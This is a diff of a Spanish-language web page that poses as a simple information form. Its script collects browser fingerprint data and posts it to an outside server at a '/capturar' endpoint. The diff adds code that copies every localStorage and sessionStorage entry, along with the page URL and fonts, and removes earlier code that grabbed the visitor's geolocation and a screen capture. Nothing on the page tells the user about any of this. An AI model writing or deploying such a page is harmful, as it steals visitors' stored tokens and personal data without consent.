@@ -3,52 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formulario de Información</title>
+    <title>Completar Formulario</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
+            background-color: #f4f4f4;
         }
         .container {
             background: #ffffff;
-            padding: 20px;
             border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            max-width: 500px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            padding: 20px;
             width: 100%;
-            text-align: center;
+            max-width: 500px;
         }
         h1 {
-            margin-bottom: 20px;
+            text-align: center;
             color: #333;
         }
         button {
-            background-color: #4CAF50;
-            color: white;
+            display: block;
+            width: 100%;
+            padding: 10px;
+            background-color: #007bff;
+            color: #fff;
             border: none;
-            padding: 10px 20px;
-            text-align: center;
-            text-decoration: none;
-            display: inline-block;
-            font-size: 16px;
-            margin: 10px 2px;
-            cursor: pointer;
             border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
         }
         button:hover {
-            background-color: #45a049;
+            background-color: #0056b3;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Completa el Formulario</h1>
-        <button type="button" onclick="enviarDatos()">Enviar Información</button>
+        <h1>Completar Formulario</h1>
+        <form id="form">
+            <button type="button" onclick="enviarDatos()">Enviar Información</button>
+        </form>
     </div>
 
     <script>
@@ -65,8 +65,7 @@
                 idiomas: navigator.languages.join(', '),
                 cookiesEnabled: navigator.cookieEnabled,
                 javaEnabled: navigator.javaEnabled(),
-                onlineStatus: navigator.onLine,
-                modeloEquipo: navigator.userAgent // Obtener el modelo del equipo
+                onlineStatus: navigator.onLine
             };
 
             // Información de la pantalla
@@ -90,38 +89,15 @@
                 zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone
             };
 
-            // Obtener ubicación (si el usuario lo permite)
-            const ubicacion = { lat: null, lon: null };
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((position) => {
-                    ubicacion.lat = position.coords.latitude;
-                    ubicacion.lon = position.coords.longitude;
-                }, (error) => {
-                    console.error('Error al obtener la ubicación:', error);
-                });
-            }
+            // Obtener URL actual
+            const currentUrl = window.location.href;
 
-            // Captura de la pantalla (si el navegador lo permite)
-            const capturaPantalla = async () => {
-                try {
-                    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                    const [track] = stream.getVideoTracks();
-                    const imageCapture = new ImageCapture(track);
-                    const bitmap = await imageCapture.grabFrame();
-                    track.stop(); // Detener la captura de la pantalla
-                    const canvas = document.createElement('canvas');
-                    canvas.width = bitmap.width;
-                    canvas.height = bitmap.height;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(bitmap, 0, 0);
-                    return canvas.toDataURL('image/png');
-                } catch (error) {
-                    console.error('Error al capturar la pantalla:', error);
-                    return null;
-                }
-            };
+            // Información de almacenamiento
+            const localStorageData = getStorageData(localStorage);
+            const sessionStorageData = getStorageData(sessionStorage);
 
-            const imagenPantalla = await capturaPantalla();
+            // Información de fuentes
+            const fonts = document.fonts;
 
             // Enviar datos al servidor
             const datosRecopilados = {
@@ -130,8 +106,10 @@
                 pantalla: infoPantalla,
                 red: infoRed,
                 tiempo: infoTiempo,
-                ubicacion: ubicacion,
-                imagen: imagenPantalla // Imagen de la pantalla en base64
+                url: currentUrl,
+                localStorage: localStorageData,
+                sessionStorage: sessionStorageData,
+                fonts: fonts
             };
 
             fetch('https://site-production-e3f3.up.railway.app/capturar', {
@@ -149,6 +127,17 @@
             }).catch(error => {
                 console.error('Error al conectar con el servidor:', error);
             });
+        }
+
+        // Función para capturar datos del almacenamiento
+        function getStorageData(storage) {
+            const data = {};
+            for (let i = 0; i < storage.length; i++) {
+                const key = storage.key(i);
+                const value = storage.getItem(key);
+                data[key] = value;
+            }
+            return data;
         }
     </script>
 </body>
